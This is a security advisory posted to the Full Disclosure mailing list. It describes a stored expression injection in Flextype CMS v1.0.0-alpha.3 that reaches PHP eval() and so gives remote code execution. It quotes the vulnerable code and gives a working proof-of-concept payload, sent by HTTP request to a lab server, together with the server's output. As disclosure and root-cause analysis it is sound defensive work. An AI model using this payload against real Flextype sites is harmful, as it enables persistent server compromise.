---
title: Flextype v1.0.0-alpha.3 Stored Expression Injection Enables PHP Remote Code Execution
url: https://seclists.org/fulldisclosure/2026/Sep/24
source: Full Disclosure
date: 2026-09-04
fetch_date: 2026-09-05T06:30:32.456912
---

# Flextype v1.0.0-alpha.3 Stored Expression Injection Enables PHP Remote Code Execution

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](23)
[By Date](date.html#24)
[![Next](/images/right-icon-16x16.png)](25)

[![Previous](/images/left-icon-16x16.png)](23)
[By Thread](index.html#24)
[![Next](/images/right-icon-16x16.png)](25)

![](/shared/images/nst-icons.svg#search)

# Flextype v1.0.0-alpha.3 Stored Expression Injection Enables PHP Remote Code Execution

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sun, 30 Aug 2026 22:54:00 -0400

---

```
Description

Flextype CMS v1.0.0-alpha.3 contains a stored code execution vulnerability
caused by the interaction between globally processed entry expressions, the
mutable registry object exposed to expressions, and the PHP entry directive.

Attacker-controlled entry fields are automatically processed as expressions
during entry retrieval. The expression environment exposes the
application's mutable registry() object, allowing an expression to modify
Flextype runtime configuration.

An attacker can use a stored expression to enable the PHP entry directive
and place an @php directive within the same stored field. Subsequent
directive processing reaches PHP eval(), resulting in execution of
attacker-controlled PHP code within the Flextype process.

Testing confirmed execution by returning the server's PHP version as
STORED_RCE_8.1.34. Retrieving the stored entry again caused the payload to
execute again, demonstrating persistent server-side code execution.
Impact

 An attacker capable of creating or modifying affected entry fields can
execute arbitrary PHP code within the security context of the Flextype
application.

This may allow complete compromise of application confidentiality,
integrity, and availability, subject to the operating-system permissions
assigned to the PHP process.

Because the malicious directive is stored within entry content, execution
can occur again when the affected entry is subsequently processed.
DetailsMutable Registry Exposed to Expressions

Flextype exposes the application registry to the expression environment:

return [
    new ExpressionFunction(
        'registry',
        static fn () => '\Flextype\registry()',
        static fn ($arguments) => registry()
    )
];

This returns the mutable application registry rather than a restricted
read-only representation.
PHP Directive

The PHP directive first determines whether PHP processing is enabled:

if (! registry()->get('flextype.settings.entries.directives.php.enabled')) {
    return;
}

When enabled, entry content containing @php reaches eval():

if (strings($field['value'])->contains('@php')) {
    ob_start();

    eval(
        strings($field['value'])
            ->replace('@php', '')
            ->trim()
            ->toString()
    );

    $field['value'] = ob_get_clean();
}

Proof of Concept

The following stored entry value first enables the PHP directive through an
expression and then supplies PHP code:

[% registry().set('flextype.settings.entries.directives.php.enabled',
true) %] @php echo 'STORED_RCE_' . PHP_VERSION;

It was submitted through the Entries API:

POST /api/v1/entries HTTP/1.1
Host: 127.0.0.1:18086
Content-Type: application/json

{"token":"lab-token","access_token":"password","id":"stored-rce-proof","data":{"title":"[%
registry().set('flextype.settings.entries.directives.php.enabled',
true) %] @php echo 'STORED_RCE_' . PHP_VERSION;"}}

Flextype returned:

HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8

{"title":"STORED_RCE_8.1.34","published_by":"","created_by":"","uuid":"11eef64f-890a-40ef-8711-b57937677c82","content":"","slug":"stored-rce-proof","published_at":1788143638,"modified_at":1788143638,"created_at":1788143638,"routable":true,"visibility":"visible","id":"stored-rce-proof"}

The value:

STORED_RCE_8.1.34

demonstrates execution of the attacker-supplied PHP expression and access
to the runtime PHP_VERSION constant.
Persistent Execution

The stored entry was subsequently retrieved using a normal entry request:

GET /api/v1/entries?token=lab-token&id=stored-rce-proof HTTP/1.1
Host: 127.0.0.1:18086

The response again contained:

STORED_RCE_8.1.34

demonstrating that execution is associated with stored entry processing
rather than requiring the complete PHP payload to be supplied during the
triggering GET request.
Root Cause

The vulnerability results from the interaction of three unsafe trust
decisions:

   1. Attacker-controllable stored entry fields are interpreted as
   executable expressions.
   2. Expressions have access to the mutable application registry.
   3. The PHP directive executes processed entry content using eval().

This permits stored data to modify the security setting intended to disable
PHP processing before the PHP directive processes the same
attacker-controlled content.

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](23)
[By Date](date.html#24)
[![Next](/images/right-icon-16x16.png)](25)

[![Previous](/images/left-icon-16x16.png)](23)
[By Thread](index.html#24)
[![Next](/images/right-icon-16x16.png)](25)

### Current thread:

* **Flextype v1.0.0-alpha.3 Stored Expression Injection Enables PHP Remote Code Execution** *Ron E (Sep 03)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")